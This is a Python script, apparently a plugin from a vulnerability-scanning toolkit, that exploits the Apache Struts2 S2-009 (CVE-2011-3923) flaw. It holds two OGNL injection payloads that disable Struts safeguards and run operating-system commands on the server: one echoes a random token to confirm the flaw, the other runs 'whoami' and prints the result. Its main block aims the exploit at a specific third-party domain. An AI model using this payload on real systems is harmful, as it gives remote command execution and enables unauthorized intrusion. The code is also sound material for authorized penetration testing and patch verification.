#!/usr/bin/env python3

'''
name: S2-009漏洞,又名CVE-2011-3923漏洞
description: S2-009漏洞可执行任意命令
'''

import re
import sys
import time
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_009_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta() 
        self.check_payload =  '?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27''' + urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8') + '''%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'''
        self.cmd_payload =  '?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'
    
    def filter(self, check_str):
        temp = ''
        for i in check_str:
            if i != '\n' and i != '\x00':
                temp = temp + i
        return temp

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            if  '.action' not in self.url:
                self.url = self.url + '/ajax/example5.action'
            check_url = self.url + self.check_payload
            check_res = request.get(check_url)
            check_str = self.filter(list(check_res.text))

            if check_res.status_code == 200 and len(check_str) < 100 and self.capta in check_str:
                cmd_url = self.url + self.cmd_payload
                cmd_res = request.get(cmd_url)
                cmd_str = self.filter(list(cmd_res.text))
                print ('存在S2-009漏洞,执行whoami命令成功，执行结果是:', cmd_str)
                return True
            else:
                #print('不存在S2-009漏洞')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass
       

if  __name__ == "__main__":
    S2_009 = S2_009_BaseVerify('http://jsfw.kydls.com')
    S2_009.run()